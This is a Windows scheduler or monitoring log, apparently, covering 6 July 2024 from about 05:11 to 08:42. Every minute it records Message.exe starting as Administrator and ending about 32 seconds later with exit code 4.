06/07/24 05:11:01,Event Started Ok, (Administrator)
06/07/24 05:11:33,Process Ended. PID:1960,ExitCode:4,Message.exe (Administrator)
06/07/24 05:12:01,Event Started Ok, (Administrator)
06/07/24 05:12:34,Process Ended. PID:2508,ExitCode:4,Message.exe (Administrator)
06/07/24 05:13:01,Event Started Ok, (Administrator)
06/07/24 05:13:32,Process Ended. PID:2504,ExitCode:4,Message.exe (Administrator)
06/07/24 05:14:01,Event Started Ok, (Administrator)
06/07/24 05:14:34,Process Ended. PID:2108,ExitCode:4,Message.exe (Administrator)
06/07/24 05:15:01,Event Started Ok, (Administrator)
06/07/24 05:15:33,Process Ended. PID:2016,ExitCode:4,Message.exe (Administrator)
06/07/24 05:16:01,Event Started Ok, (Administrator)
06/07/24 05:16:33,Process Ended. PID:1660,ExitCode:4,Message.exe (Administrator)
06/07/24 05:17:01,Event Started Ok, (Administrator)
06/07/24 05:17:33,Process Ended. PID:644,ExitCode:4,Message.exe (Administrator)
06/07/24 05:18:00,Event Started Ok, (Administrator)
06/07/24 05:18:34,Process Ended. PID:1300,ExitCode:4,Message.exe (Administrator)
06/07/24 05:19:01,Event Started Ok, (Administrator)
06/07/24 05:19:33,Process Ended. PID:2364,ExitCode:4,Message.exe (Administrator)
06/07/24 05:20:02,Event Started Ok, (Administrator)
06/07/24 05:20:34,Process Ended. PID:2328,ExitCode:4,Message.exe (Administrator)
06/07/24 05:21:01,Event Started Ok, (Administrator)
06/07/24 05:21:33,Process Ended. PID:2340,ExitCode:4,Message.exe (Administrator)
06/07/24 05:22:02,Event Started Ok, (Administrator)
06/07/24 05:22:34,Process Ended. PID:1408,ExitCode:4,Message.exe (Administrator)
06/07/24 05:23:01,Event Started Ok, (Administrator)
06/07/24 05:23:33,Process Ended. PID:1660,ExitCode:4,Message.exe (Administrator)
06/07/24 05:24:01,Event Started Ok, (Administrator)
06/07/24 05:24:34,Process Ended. PID:2516,ExitCode:4,Message.exe (Administrator)
06/07/24 05:25:01,Event Started Ok, (Administrator)
06/07/24 05:25:33,Process Ended. PID:1656,ExitCode:4,Message.exe (Administrator)
06/07/24 05:26:01,Event Started Ok, (Administrator)
06/07/24 05:26:34,Process Ended. PID:2016,ExitCode:4,Message.exe (Administrator)
06/07/24 05:27:01,Event Started Ok, (Administrator)
06/07/24 05:27:33,Process Ended. PID:2320,ExitCode:4,Message.exe (Administrator)
06/07/24 05:28:01,Event Started Ok, (Administrator)
06/07/24 05:28:34,Process Ended. PID:1904,ExitCode:4,Message.exe (Administrator)
06/07/24 05:29:01,Event Started Ok, (Administrator)
06/07/24 05:29:33,Process Ended. PID:2460,ExitCode:4,Message.exe (Administrator)
06/07/24 05:30:01,Event Started Ok, (Administrator)
06/07/24 05:30:34,Process Ended. PID:1404,ExitCode:4,Message.exe (Administrator)
06/07/24 05:31:01,Event Started Ok, (Administrator)
06/07/24 05:31:33,Process Ended. PID:2672,ExitCode:4,Message.exe (Administrator)
06/07/24 05:32:01,Event Started Ok, (Administrator)
06/07/24 05:32:33,Process Ended. PID:2952,ExitCode:4,Message.exe (Administrator)
06/07/24 05:33:01,Event Started Ok, (Administrator)
06/07/24 05:33:33,Process Ended. PID:2320,ExitCode:4,Message.exe (Administrator)
06/07/24 05:34:01,Event Started Ok, (Administrator)
06/07/24 05:34:33,Process Ended. PID:840,ExitCode:4,Message.exe (Administrator)
06/07/24 05:35:01,Event Started Ok, (Administrator)
06/07/24 05:35:33,Process Ended. PID:2872,ExitCode:4,Message.exe (Administrator)
06/07/24 05:36:01,Event Started Ok, (Administrator)
06/07/24 05:36:33,Process Ended. PID:2388,ExitCode:4,Message.exe (Administrator)
06/07/24 05:37:01,Event Started Ok, (Administrator)
06/07/24 05:37:33,Process Ended. PID:1852,ExitCode:4,Message.exe (Administrator)
06/07/24 05:38:01,Event Started Ok, (Administrator)
06/07/24 05:38:33,Process Ended. PID:2108,ExitCode:4,Message.exe (Administrator)
06/07/24 05:39:01,Event Started Ok, (Administrator)
06/07/24 05:39:33,Process Ended. PID:1008,ExitCode:4,Message.exe (Administrator)
06/07/24 05:40:01,Event Started Ok, (Administrator)
06/07/24 05:40:33,Process Ended. PID:988,ExitCode:4,Message.exe (Administrator)
06/07/24 05:41:01,Event Started Ok, (Administrator)
06/07/24 05:41:33,Process Ended. PID:1612,ExitCode:4,Message.exe (Administrator)
06/07/24 05:42:01,Event Started Ok, (Administrator)
06/07/24 05:42:33,Process Ended. PID:2568,ExitCode:4,Message.exe (Administrator)
06/07/24 05:43:02,Event Started Ok, (Administrator)
06/07/24 05:43:34,Process Ended. PID:516,ExitCode:4,Message.exe (Administrator)
06/07/24 05:44:01,Event Started Ok, (Administrator)
06/07/24 05:44:33,Process Ended. PID:1720,ExitCode:4,Message.exe (Administrator)
06/07/24 05:45:01,Event Started Ok, (Administrator)
06/07/24 05:45:34,Process Ended. PID:2712,ExitCode:4,Message.exe (Administrator)
06/07/24 05:46:01,Event Started Ok, (Administrator)
06/07/24 05:46:33,Process Ended. PID:1756,ExitCode:4,Message.exe (Administrator)
06/07/24 05:47:02,Event Started Ok, (Administrator)
06/07/24 05:47:34,Process Ended. PID:3048,ExitCode:4,Message.exe (Administrator)
06/07/24 05:48:01,Event Started Ok, (Administrator)
06/07/24 05:48:33,Process Ended. PID:2872,ExitCode:4,Message.exe (Administrator)
06/07/24 05:49:02,Event Started Ok, (Administrator)
06/07/24 05:49:34,Process Ended. PID:2260,ExitCode:4,Message.exe (Administrator)
06/07/24 05:50:01,Event Started Ok, (Administrator)
06/07/24 05:50:33,Process Ended. PID:2612,ExitCode:4,Message.exe (Administrator)
06/07/24 05:51:01,Event Started Ok, (Administrator)
06/07/24 05:51:34,Process Ended. PID:1972,ExitCode:4,Message.exe (Administrator)
06/07/24 05:52:00,Event Started Ok, (Administrator)
06/07/24 05:52:33,Process Ended. PID:1520,ExitCode:4,Message.exe (Administrator)
06/07/24 05:53:01,Event Started Ok, (Administrator)
06/07/24 05:53:33,Process Ended. PID:3048,ExitCode:4,Message.exe (Administrator)
06/07/24 05:54:01,Event Started Ok, (Administrator)
06/07/24 05:54:33,Process Ended. PID:2844,ExitCode:4,Message.exe (Administrator)
06/07/24 05:55:01,Event Started Ok, (Administrator)
06/07/24 05:55:33,Process Ended. PID:2016,ExitCode:4,Message.exe (Administrator)
06/07/24 05:56:01,Event Started Ok, (Administrator)
06/07/24 05:56:33,Process Ended. PID:2424,ExitCode:4,Message.exe (Administrator)
06/07/24 05:57:01,Event Started Ok, (Administrator)
06/07/24 05:57:33,Process Ended. PID:968,ExitCode:4,Message.exe (Administrator)
06/07/24 05:58:02,Event Started Ok, (Administrator)
06/07/24 05:58:34,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)
06/07/24 05:59:01,Event Started Ok, (Administrator)
06/07/24 05:59:33,Process Ended. PID:1920,ExitCode:4,Message.exe (Administrator)
06/07/24 06:00:01,Event Started Ok, (Administrator)
06/07/24 06:00:33,Process Ended. PID:568,ExitCode:4,Message.exe (Administrator)
06/07/24 06:01:01,Event Started Ok, (Administrator)
06/07/24 06:01:33,Process Ended. PID:2364,ExitCode:4,Message.exe (Administrator)
06/07/24 06:02:01,Event Started Ok, (Administrator)
06/07/24 06:02:33,Process Ended. PID:2612,ExitCode:4,Message.exe (Administrator)
06/07/24 06:03:01,Event Started Ok, (Administrator)
06/07/24 06:03:33,Process Ended. PID:2080,ExitCode:4,Message.exe (Administrator)
06/07/24 06:04:00,Event Started Ok, (Administrator)
06/07/24 06:04:33,Process Ended. PID:1836,ExitCode:4,Message.exe (Administrator)
06/07/24 06:05:01,Event Started Ok, (Administrator)
06/07/24 06:05:33,Process Ended. PID:2260,ExitCode:4,Message.exe (Administrator)
06/07/24 06:06:01,Event Started Ok, (Administrator)
06/07/24 06:06:33,Process Ended. PID:1392,ExitCode:4,Message.exe (Administrator)
06/07/24 06:07:01,Event Started Ok, (Administrator)
06/07/24 06:07:33,Process Ended. PID:2020,ExitCode:4,Message.exe (Administrator)
06/07/24 06:08:01,Event Started Ok, (Administrator)
06/07/24 06:08:33,Process Ended. PID:1836,ExitCode:4,Message.exe (Administrator)
06/07/24 06:09:01,Event Started Ok, (Administrator)
06/07/24 06:09:34,Process Ended. PID:972,ExitCode:4,Message.exe (Administrator)
06/07/24 06:10:01,Event Started Ok, (Administrator)
06/07/24 06:10:33,Process Ended. PID:2500,ExitCode:4,Message.exe (Administrator)
06/07/24 06:11:01,Event Started Ok, (Administrator)
06/07/24 06:11:34,Process Ended. PID:2752,ExitCode:4,Message.exe (Administrator)
06/07/24 06:12:01,Event Started Ok, (Administrator)
06/07/24 06:12:33,Process Ended. PID:2992,ExitCode:4,Message.exe (Administrator)
06/07/24 06:13:01,Event Started Ok, (Administrator)
06/07/24 06:13:34,Process Ended. PID:1920,ExitCode:4,Message.exe (Administrator)
06/07/24 06:14:01,Event Started Ok, (Administrator)
06/07/24 06:14:33,Process Ended. PID:2992,ExitCode:4,Message.exe (Administrator)
06/07/24 06:15:01,Event Started Ok, (Administrator)
06/07/24 06:15:33,Process Ended. PID:2388,ExitCode:4,Message.exe (Administrator)
06/07/24 06:16:01,Event Started Ok, (Administrator)
06/07/24 06:16:33,Process Ended. PID:1608,ExitCode:4,Message.exe (Administrator)
06/07/24 06:17:01,Event Started Ok, (Administrator)
06/07/24 06:17:34,Process Ended. PID:1824,ExitCode:4,Message.exe (Administrator)
06/07/24 06:18:01,Event Started Ok, (Administrator)
06/07/24 06:18:33,Process Ended. PID:2364,ExitCode:4,Message.exe (Administrator)
06/07/24 06:19:01,Event Started Ok, (Administrator)
06/07/24 06:19:34,Process Ended. PID:2804,ExitCode:4,Message.exe (Administrator)
06/07/24 06:20:01,Event Started Ok, (Administrator)
06/07/24 06:20:33,Process Ended. PID:1824,ExitCode:4,Message.exe (Administrator)
06/07/24 06:21:01,Event Started Ok, (Administrator)
06/07/24 06:21:34,Process Ended. PID:1520,ExitCode:4,Message.exe (Administrator)
06/07/24 06:22:00,Event Started Ok, (Administrator)
06/07/24 06:22:33,Process Ended. PID:2072,ExitCode:4,Message.exe (Administrator)
06/07/24 06:23:01,Event Started Ok, (Administrator)
06/07/24 06:23:34,Process Ended. PID:2504,ExitCode:4,Message.exe (Administrator)
06/07/24 06:24:01,Event Started Ok, (Administrator)
06/07/24 06:24:33,Process Ended. PID:1152,ExitCode:4,Message.exe (Administrator)
06/07/24 06:25:02,Event Started Ok, (Administrator)
06/07/24 06:25:34,Process Ended. PID:968,ExitCode:4,Message.exe (Administrator)
06/07/24 06:26:01,Event Started Ok, (Administrator)
06/07/24 06:26:33,Process Ended. PID:1944,ExitCode:4,Message.exe (Administrator)
06/07/24 06:27:02,Event Started Ok, (Administrator)
06/07/24 06:27:34,Process Ended. PID:1968,ExitCode:4,Message.exe (Administrator)
06/07/24 06:28:01,Event Started Ok, (Administrator)
06/07/24 06:28:33,Process Ended. PID:516,ExitCode:4,Message.exe (Administrator)
06/07/24 06:29:02,Event Started Ok, (Administrator)
06/07/24 06:29:34,Process Ended. PID:2332,ExitCode:4,Message.exe (Administrator)
06/07/24 06:30:01,Event Started Ok, (Administrator)
06/07/24 06:30:33,Process Ended. PID:2388,ExitCode:4,Message.exe (Administrator)
06/07/24 06:31:02,Event Started Ok, (Administrator)
06/07/24 06:31:34,Process Ended. PID:3056,ExitCode:4,Message.exe (Administrator)
06/07/24 06:32:01,Event Started Ok, (Administrator)
06/07/24 06:32:33,Process Ended. PID:3024,ExitCode:4,Message.exe (Administrator)
06/07/24 06:33:01,Event Started Ok, (Administrator)
06/07/24 06:33:34,Process Ended. PID:1396,ExitCode:4,Message.exe (Administrator)
06/07/24 06:34:01,Event Started Ok, (Administrator)
06/07/24 06:34:33,Process Ended. PID:2080,ExitCode:4,Message.exe (Administrator)
06/07/24 06:35:01,Event Started Ok, (Administrator)
06/07/24 06:35:34,Process Ended. PID:2476,ExitCode:4,Message.exe (Administrator)
06/07/24 06:36:01,Event Started Ok, (Administrator)
06/07/24 06:36:33,Process Ended. PID:1040,ExitCode:4,Message.exe (Administrator)
06/07/24 06:37:02,Event Started Ok, (Administrator)
06/07/24 06:37:34,Process Ended. PID:2096,ExitCode:4,Message.exe (Administrator)
06/07/24 06:38:01,Event Started Ok, (Administrator)
06/07/24 06:38:33,Process Ended. PID:2056,ExitCode:4,Message.exe (Administrator)
06/07/24 06:39:02,Event Started Ok, (Administrator)
06/07/24 06:39:34,Process Ended. PID:1152,ExitCode:4,Message.exe (Administrator)
06/07/24 06:40:01,Event Started Ok, (Administrator)
06/07/24 06:40:33,Process Ended. PID:416,ExitCode:4,Message.exe (Administrator)
06/07/24 06:41:01,Event Started Ok, (Administrator)
06/07/24 06:41:34,Process Ended. PID:3016,ExitCode:4,Message.exe (Administrator)
06/07/24 06:42:01,Event Started Ok, (Administrator)
06/07/24 06:42:33,Process Ended. PID:2480,ExitCode:4,Message.exe (Administrator)
06/07/24 06:43:00,Event Started Ok, (Administrator)
06/07/24 06:43:34,Process Ended. PID:2612,ExitCode:4,Message.exe (Administrator)
06/07/24 06:44:01,Event Started Ok, (Administrator)
06/07/24 06:44:33,Process Ended. PID:2892,ExitCode:4,Message.exe (Administrator)
06/07/24 06:45:01,Event Started Ok, (Administrator)
06/07/24 06:45:34,Process Ended. PID:3016,ExitCode:4,Message.exe (Administrator)
06/07/24 06:46:00,Event Started Ok, (Administrator)
06/07/24 06:46:33,Process Ended. PID:700,ExitCode:4,Message.exe (Administrator)
06/07/24 06:47:02,Event Started Ok, (Administrator)
06/07/24 06:47:34,Process Ended. PID:2772,ExitCode:4,Message.exe (Administrator)
06/07/24 06:48:01,Event Started Ok, (Administrator)
06/07/24 06:48:33,Process Ended. PID:3004,ExitCode:4,Message.exe (Administrator)
06/07/24 06:49:02,Event Started Ok, (Administrator)
06/07/24 06:49:34,Process Ended. PID:2908,ExitCode:4,Message.exe (Administrator)
06/07/24 06:50:01,Event Started Ok, (Administrator)
06/07/24 06:50:33,Process Ended. PID:1984,ExitCode:4,Message.exe (Administrator)
06/07/24 06:51:02,Event Started Ok, (Administrator)
06/07/24 06:51:34,Process Ended. PID:1620,ExitCode:4,Message.exe (Administrator)
06/07/24 06:52:01,Event Started Ok, (Administrator)
06/07/24 06:52:33,Process Ended. PID:1708,ExitCode:4,Message.exe (Administrator)
06/07/24 06:53:01,Event Started Ok, (Administrator)
06/07/24 06:53:33,Process Ended. PID:1408,ExitCode:4,Message.exe (Administrator)
06/07/24 06:54:01,Event Started Ok, (Administrator)
06/07/24 06:54:33,Process Ended. PID:700,ExitCode:4,Message.exe (Administrator)
06/07/24 06:55:02,Event Started Ok, (Administrator)
06/07/24 06:55:34,Process Ended. PID:516,ExitCode:4,Message.exe (Administrator)
06/07/24 06:56:01,Event Started Ok, (Administrator)
06/07/24 06:56:33,Process Ended. PID:2276,ExitCode:4,Message.exe (Administrator)
06/07/24 06:57:01,Event Started Ok, (Administrator)
06/07/24 06:57:34,Process Ended. PID:2700,ExitCode:4,Message.exe (Administrator)
06/07/24 06:58:01,Event Started Ok, (Administrator)
06/07/24 06:58:33,Process Ended. PID:1396,ExitCode:4,Message.exe (Administrator)
06/07/24 06:59:00,Event Started Ok, (Administrator)
06/07/24 06:59:34,Process Ended. PID:1244,ExitCode:4,Message.exe (Administrator)
06/07/24 07:00:01,Event Started Ok, (Administrator)
06/07/24 07:00:33,Process Ended. PID:2144,ExitCode:4,Message.exe (Administrator)
06/07/24 07:01:01,Event Started Ok, (Administrator)
06/07/24 07:01:34,Process Ended. PID:968,ExitCode:4,Message.exe (Administrator)
06/07/24 07:02:01,Event Started Ok, (Administrator)
06/07/24 07:02:33,Process Ended. PID:1152,ExitCode:4,Message.exe (Administrator)
06/07/24 07:03:02,Event Started Ok, (Administrator)
06/07/24 07:03:34,Process Ended. PID:2380,ExitCode:4,Message.exe (Administrator)
06/07/24 07:04:00,Event Started Ok, (Administrator)
06/07/24 07:04:33,Process Ended. PID:108,ExitCode:4,Message.exe (Administrator)
06/07/24 07:05:02,Event Started Ok, (Administrator)
06/07/24 07:05:34,Process Ended. PID:2884,ExitCode:4,Message.exe (Administrator)
06/07/24 07:06:01,Event Started Ok, (Administrator)
06/07/24 07:06:33,Process Ended. PID:2388,ExitCode:4,Message.exe (Administrator)
06/07/24 07:07:01,Event Started Ok, (Administrator)
06/07/24 07:07:34,Process Ended. PID:2772,ExitCode:4,Message.exe (Administrator)
06/07/24 07:08:01,Event Started Ok, (Administrator)
06/07/24 07:08:33,Process Ended. PID:756,ExitCode:4,Message.exe (Administrator)
06/07/24 07:09:02,Event Started Ok, (Administrator)
06/07/24 07:09:34,Process Ended. PID:1680,ExitCode:4,Message.exe (Administrator)
06/07/24 07:10:01,Event Started Ok, (Administrator)
06/07/24 07:10:33,Process Ended. PID:2568,ExitCode:4,Message.exe (Administrator)
06/07/24 07:11:02,Event Started Ok, (Administrator)
06/07/24 07:11:34,Process Ended. PID:2700,ExitCode:4,Message.exe (Administrator)
06/07/24 07:12:00,Event Started Ok, (Administrator)
06/07/24 07:12:33,Process Ended. PID:3056,ExitCode:4,Message.exe (Administrator)
06/07/24 07:13:02,Event Started Ok, (Administrator)
06/07/24 07:13:34,Process Ended. PID:1944,ExitCode:4,Message.exe (Administrator)
06/07/24 07:14:01,Event Started Ok, (Administrator)
06/07/24 07:14:33,Process Ended. PID:2772,ExitCode:4,Message.exe (Administrator)
06/07/24 07:15:02,Event Started Ok, (Administrator)
06/07/24 07:15:34,Process Ended. PID:848,ExitCode:4,Message.exe (Administrator)
06/07/24 07:16:01,Event Started Ok, (Administrator)
06/07/24 07:16:33,Process Ended. PID:2012,ExitCode:4,Message.exe (Administrator)
06/07/24 07:17:02,Event Started Ok, (Administrator)
06/07/24 07:17:34,Process Ended. PID:1896,ExitCode:4,Message.exe (Administrator)
06/07/24 07:18:00,Event Started Ok, (Administrator)
06/07/24 07:18:33,Process Ended. PID:1032,ExitCode:4,Message.exe (Administrator)
06/07/24 07:19:01,Event Started Ok, (Administrator)
06/07/24 07:19:34,Process Ended. PID:1948,ExitCode:4,Message.exe (Administrator)
06/07/24 07:20:00,Event Started Ok, (Administrator)
06/07/24 07:20:33,Process Ended. PID:996,ExitCode:4,Message.exe (Administrator)
06/07/24 07:21:01,Event Started Ok, (Administrator)
06/07/24 07:21:34,Process Ended. PID:2096,ExitCode:4,Message.exe (Administrator)
06/07/24 07:22:01,Event Started Ok, (Administrator)
06/07/24 07:22:33,Process Ended. PID:148,ExitCode:4,Message.exe (Administrator)
06/07/24 07:23:01,Event Started Ok, (Administrator)
06/07/24 07:23:34,Process Ended. PID:1824,ExitCode:4,Message.exe (Administrator)
06/07/24 07:24:01,Event Started Ok, (Administrator)
06/07/24 07:24:33,Process Ended. PID:2736,ExitCode:4,Message.exe (Administrator)
06/07/24 07:25:01,Event Started Ok, (Administrator)
06/07/24 07:25:34,Process Ended. PID:1632,ExitCode:4,Message.exe (Administrator)
06/07/24 07:26:01,Event Started Ok, (Administrator)
06/07/24 07:26:33,Process Ended. PID:1852,ExitCode:4,Message.exe (Administrator)
06/07/24 07:27:01,Event Started Ok, (Administrator)
06/07/24 07:27:34,Process Ended. PID:1896,ExitCode:4,Message.exe (Administrator)
06/07/24 07:28:00,Event Started Ok, (Administrator)
06/07/24 07:28:33,Process Ended. PID:2420,ExitCode:4,Message.exe (Administrator)
06/07/24 07:29:01,Event Started Ok, (Administrator)
06/07/24 07:29:34,Process Ended. PID:896,ExitCode:4,Message.exe (Administrator)
06/07/24 07:30:01,Event Started Ok, (Administrator)
06/07/24 07:30:32,Process Ended. PID:1916,ExitCode:4,Message.exe (Administrator)
06/07/24 07:31:01,Event Started Ok, (Administrator)
06/07/24 07:31:34,Process Ended. PID:2612,ExitCode:4,Message.exe (Administrator)
06/07/24 07:32:01,Event Started Ok, (Administrator)
06/07/24 07:32:33,Process Ended. PID:1152,ExitCode:4,Message.exe (Administrator)
06/07/24 07:33:01,Event Started Ok, (Administrator)
06/07/24 07:33:34,Process Ended. PID:1520,ExitCode:4,Message.exe (Administrator)
06/07/24 07:34:01,Event Started Ok, (Administrator)
06/07/24 07:34:33,Process Ended. PID:1880,ExitCode:4,Message.exe (Administrator)
06/07/24 07:35:01,Event Started Ok, (Administrator)
06/07/24 07:35:33,Process Ended. PID:2004,ExitCode:4,Message.exe (Administrator)
06/07/24 07:36:01,Event Started Ok, (Administrator)
06/07/24 07:36:33,Process Ended. PID:1720,ExitCode:4,Message.exe (Administrator)
06/07/24 07:37:01,Event Started Ok, (Administrator)
06/07/24 07:37:33,Process Ended. PID:1300,ExitCode:4,Message.exe (Administrator)
06/07/24 07:38:01,Event Started Ok, (Administrator)
06/07/24 07:38:35,Process Ended. PID:1620,ExitCode:4,Message.exe (Administrator)
06/07/24 07:39:01,Event Started Ok, (Administrator)
06/07/24 07:39:33,Process Ended. PID:1800,ExitCode:4,Message.exe (Administrator)
06/07/24 07:40:01,Event Started Ok, (Administrator)
06/07/24 07:40:33,Process Ended. PID:2408,ExitCode:4,Message.exe (Administrator)
06/07/24 07:41:00,Event Started Ok, (Administrator)
06/07/24 07:41:33,Process Ended. PID:2320,ExitCode:4,Message.exe (Administrator)
06/07/24 07:42:01,Event Started Ok, (Administrator)
06/07/24 07:42:33,Process Ended. PID:2600,ExitCode:4,Message.exe (Administrator)
06/07/24 07:43:01,Event Started Ok, (Administrator)
06/07/24 07:43:33,Process Ended. PID:2800,ExitCode:4,Message.exe (Administrator)
06/07/24 07:44:01,Event Started Ok, (Administrator)
06/07/24 07:44:33,Process Ended. PID:2612,ExitCode:4,Message.exe (Administrator)
06/07/24 07:45:01,Event Started Ok, (Administrator)
06/07/24 07:45:33,Process Ended. PID:2148,ExitCode:4,Message.exe (Administrator)
06/07/24 07:46:01,Event Started Ok, (Administrator)
06/07/24 07:46:33,Process Ended. PID:508,ExitCode:4,Message.exe (Administrator)
06/07/24 07:47:01,Event Started Ok, (Administrator)
06/07/24 07:47:33,Process Ended. PID:2456,ExitCode:4,Message.exe (Administrator)
06/07/24 07:48:01,Event Started Ok, (Administrator)
06/07/24 07:48:33,Process Ended. PID:968,ExitCode:4,Message.exe (Administrator)
06/07/24 07:49:01,Event Started Ok, (Administrator)
06/07/24 07:49:33,Process Ended. PID:1484,ExitCode:4,Message.exe (Administrator)
06/07/24 07:50:01,Event Started Ok, (Administrator)
06/07/24 07:50:33,Process Ended. PID:644,ExitCode:4,Message.exe (Administrator)
06/07/24 07:51:01,Event Started Ok, (Administrator)
06/07/24 07:51:33,Process Ended. PID:2824,ExitCode:4,Message.exe (Administrator)
06/07/24 07:52:01,Event Started Ok, (Administrator)
06/07/24 07:52:33,Process Ended. PID:996,ExitCode:4,Message.exe (Administrator)
06/07/24 07:53:01,Event Started Ok, (Administrator)
06/07/24 07:53:33,Process Ended. PID:384,ExitCode:4,Message.exe (Administrator)
06/07/24 07:54:02,Event Started Ok, (Administrator)
06/07/24 07:54:34,Process Ended. PID:3056,ExitCode:4,Message.exe (Administrator)
06/07/24 07:55:01,Event Started Ok, (Administrator)
06/07/24 07:55:33,Process Ended. PID:1944,ExitCode:4,Message.exe (Administrator)
06/07/24 07:56:01,Event Started Ok, (Administrator)
06/07/24 07:56:34,Process Ended. PID:1888,ExitCode:4,Message.exe (Administrator)
06/07/24 07:57:00,Event Started Ok, (Administrator)
06/07/24 07:57:33,Process Ended. PID:2324,ExitCode:4,Message.exe (Administrator)
06/07/24 07:58:00,Event Started Ok, (Administrator)
06/07/24 07:58:34,Process Ended. PID:2992,ExitCode:4,Message.exe (Administrator)
06/07/24 07:59:01,Event Started Ok, (Administrator)
06/07/24 07:59:33,Process Ended. PID:3024,ExitCode:4,Message.exe (Administrator)
06/07/24 08:00:01,Event Started Ok, (Administrator)
06/07/24 08:00:34,Process Ended. PID:2552,ExitCode:4,Message.exe (Administrator)
06/07/24 08:01:01,Event Started Ok, (Administrator)
06/07/24 08:01:33,Process Ended. PID:2340,ExitCode:4,Message.exe (Administrator)
06/07/24 08:02:01,Event Started Ok, (Administrator)
06/07/24 08:02:33,Process Ended. PID:2788,ExitCode:4,Message.exe (Administrator)
06/07/24 08:03:01,Event Started Ok, (Administrator)
06/07/24 08:03:33,Process Ended. PID:1116,ExitCode:4,Message.exe (Administrator)
06/07/24 08:04:01,Event Started Ok, (Administrator)
06/07/24 08:04:33,Process Ended. PID:1052,ExitCode:4,Message.exe (Administrator)
06/07/24 08:05:02,Event Started Ok, (Administrator)
06/07/24 08:05:34,Process Ended. PID:2408,ExitCode:4,Message.exe (Administrator)
06/07/24 08:06:01,Event Started Ok, (Administrator)
06/07/24 08:06:33,Process Ended. PID:2884,ExitCode:4,Message.exe (Administrator)
06/07/24 08:07:02,Event Started Ok, (Administrator)
06/07/24 08:07:33,Process Ended. PID:2416,ExitCode:4,Message.exe (Administrator)
06/07/24 08:08:00,Event Started Ok, (Administrator)
06/07/24 08:08:33,Process Ended. PID:2508,ExitCode:4,Message.exe (Administrator)
06/07/24 08:09:02,Event Started Ok, (Administrator)
06/07/24 08:09:34,Process Ended. PID:568,ExitCode:4,Message.exe (Administrator)
06/07/24 08:10:01,Event Started Ok, (Administrator)
06/07/24 08:10:33,Process Ended. PID:2384,ExitCode:4,Message.exe (Administrator)
06/07/24 08:11:01,Event Started Ok, (Administrator)
06/07/24 08:11:33,Process Ended. PID:2892,ExitCode:4,Message.exe (Administrator)
06/07/24 08:12:01,Event Started Ok, (Administrator)
06/07/24 08:12:33,Process Ended. PID:1716,ExitCode:4,Message.exe (Administrator)
06/07/24 08:13:01,Event Started Ok, (Administrator)
06/07/24 08:13:33,Process Ended. PID:508,ExitCode:4,Message.exe (Administrator)
06/07/24 08:14:01,Event Started Ok, (Administrator)
06/07/24 08:14:33,Process Ended. PID:2828,ExitCode:4,Message.exe (Administrator)
06/07/24 08:15:01,Event Started Ok, (Administrator)
06/07/24 08:15:33,Process Ended. PID:1660,ExitCode:4,Message.exe (Administrator)
06/07/24 08:16:01,Event Started Ok, (Administrator)
06/07/24 08:16:33,Process Ended. PID:1824,ExitCode:4,Message.exe (Administrator)
06/07/24 08:17:01,Event Started Ok, (Administrator)
06/07/24 08:17:33,Process Ended. PID:384,ExitCode:4,Message.exe (Administrator)
06/07/24 08:18:01,Event Started Ok, (Administrator)
06/07/24 08:18:33,Process Ended. PID:1880,ExitCode:4,Message.exe (Administrator)
06/07/24 08:19:01,Event Started Ok, (Administrator)
06/07/24 08:19:33,Process Ended. PID:1920,ExitCode:4,Message.exe (Administrator)
06/07/24 08:20:01,Event Started Ok, (Administrator)
06/07/24 08:20:33,Process Ended. PID:148,ExitCode:4,Message.exe (Administrator)
06/07/24 08:21:01,Event Started Ok, (Administrator)
06/07/24 08:21:33,Process Ended. PID:2348,ExitCode:4,Message.exe (Administrator)
06/07/24 08:22:01,Event Started Ok, (Administrator)
06/07/24 08:22:33,Process Ended. PID:1888,ExitCode:4,Message.exe (Administrator)
06/07/24 08:23:01,Event Started Ok, (Administrator)
06/07/24 08:23:33,Process Ended. PID:888,ExitCode:4,Message.exe (Administrator)
06/07/24 08:24:01,Event Started Ok, (Administrator)
06/07/24 08:24:33,Process Ended. PID:2612,ExitCode:4,Message.exe (Administrator)
06/07/24 08:25:01,Event Started Ok, (Administrator)
06/07/24 08:25:34,Process Ended. PID:1676,ExitCode:4,Message.exe (Administrator)
06/07/24 08:26:01,Event Started Ok, (Administrator)
06/07/24 08:26:33,Process Ended. PID:1792,ExitCode:4,Message.exe (Administrator)
06/07/24 08:27:01,Event Started Ok, (Administrator)
06/07/24 08:27:33,Process Ended. PID:2000,ExitCode:4,Message.exe (Administrator)
06/07/24 08:28:01,Event Started Ok, (Administrator)
06/07/24 08:28:33,Process Ended. PID:1152,ExitCode:4,Message.exe (Administrator)
06/07/24 08:29:01,Event Started Ok, (Administrator)
06/07/24 08:29:33,Process Ended. PID:1820,ExitCode:4,Message.exe (Administrator)
06/07/24 08:30:01,Event Started Ok, (Administrator)
06/07/24 08:30:33,Process Ended. PID:848,ExitCode:4,Message.exe (Administrator)
06/07/24 08:31:01,Event Started Ok, (Administrator)
06/07/24 08:31:33,Process Ended. PID:888,ExitCode:4,Message.exe (Administrator)
06/07/24 08:32:01,Event Started Ok, (Administrator)
06/07/24 08:32:33,Process Ended. PID:384,ExitCode:4,Message.exe (Administrator)
06/07/24 08:33:01,Event Started Ok, (Administrator)
06/07/24 08:33:33,Process Ended. PID:2004,ExitCode:4,Message.exe (Administrator)
06/07/24 08:34:01,Event Started Ok, (Administrator)
06/07/24 08:34:33,Process Ended. PID:2828,ExitCode:4,Message.exe (Administrator)
06/07/24 08:35:01,Event Started Ok, (Administrator)
06/07/24 08:35:33,Process Ended. PID:2080,ExitCode:4,Message.exe (Administrator)
06/07/24 08:36:01,Event Started Ok, (Administrator)
06/07/24 08:36:33,Process Ended. PID:1196,ExitCode:4,Message.exe (Administrator)
06/07/24 08:37:01,Event Started Ok, (Administrator)
06/07/24 08:37:33,Process Ended. PID:644,ExitCode:4,Message.exe (Administrator)
06/07/24 08:38:00,Event Started Ok, (Administrator)
06/07/24 08:38:33,Process Ended. PID:2232,ExitCode:4,Message.exe (Administrator)
06/07/24 08:39:01,Event Started Ok, (Administrator)
06/07/24 08:39:33,Process Ended. PID:2324,ExitCode:4,Message.exe (Administrator)
06/07/24 08:40:01,Event Started Ok, (Administrator)
06/07/24 08:40:33,Process Ended. PID:1708,ExitCode:4,Message.exe (Administrator)
06/07/24 08:41:01,Event Started Ok, (Administrator)
06/07/24 08:41:33,Process Ended. PID:2972,ExitCode:4,Message.exe (Administrator)
06/07/24 08:42:01,Event Started Ok, (Administrator)
